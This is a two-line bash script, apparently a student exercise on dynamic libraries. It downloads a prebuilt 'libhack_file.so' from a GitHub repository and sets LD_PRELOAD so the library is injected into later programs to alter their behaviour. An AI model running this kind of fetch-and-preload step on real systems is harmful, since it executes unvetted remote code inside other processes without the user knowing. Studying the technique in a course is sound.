#!/bin/bash
wget -p .. https://raw.githubusercontent.com/papaseyone/alx-low_level_programming/master/0x18-dynamic_libraries/libhack_file.so
export LD_PRELOAD="$PWD/../libhack_file.so"
